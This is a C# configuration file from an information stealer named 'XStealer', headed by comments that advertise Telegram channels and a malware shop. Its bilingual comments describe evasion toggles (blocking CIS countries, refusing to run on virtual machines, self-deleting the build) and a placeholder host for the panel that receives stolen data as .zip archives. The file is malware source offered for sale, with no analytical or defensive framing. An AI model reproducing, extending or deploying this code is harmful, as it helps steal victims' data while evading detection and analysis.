// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System.Linq;

    public static class Configurations
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Активатор запрета работы в странах СНГ</br>
        /// <br><b>ENG</b></br><br>Activator of the ban on work in the CIS countries</br>
        /// </summary>
        public static bool Act_Country = false;

        /// <summary>
        /// <br><b>RUS</b></br><br>Активатор запрета работы на виртуальной машине</br>
        /// <br><b>ENG</b></br><br>Virtual machine deny activator</br>
        /// </summary>
        public static bool Act_Virtual_Machine = false;

        /// <summary>
        /// <br><b>RUS</b></br><br>Активатор логгера</br>
        /// <br><b>ENG</b></br><br>Logger activator</br>
        /// </summary>
        public static bool Act_LogClient = false;

        /// <summary>
        /// <br><b>RUS</b></br><br>Активатор само удаления билд файла</br>
        /// <br><b>ENG</b></br><br>Activator to self-delete build file</br>
        /// </summary>
        public static bool Act_Self = false;

        /// <summary>
        /// <br><b>RUS</b></br><br>Панель для отправки .Zip архива</br>
        /// <br><b>ENG</b></br><br>Panel for sending .Zip archive</br>
        /// </summary>
        public static string Host = "#HOST#";

        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для проверки .Zip архива на корректность данных</br>
        /// <br><b>ENG</b></br><br>Method for checking .Zip archive for data correctness</br>
        /// </summary>
        /// <param name="archive"><br><b>RUS</b></br><br>Массив байтов .Zip архива</br><br><b>ENG</b></br><br>Array of bytes .Zip archive</br></param>
        /// <returns>True/False</returns>
        public static bool ValidateZip(byte[] archive)
        {
            int? size = archive?.Length;
            return size != null && archive.Any() && size > 20;
        }
    }
}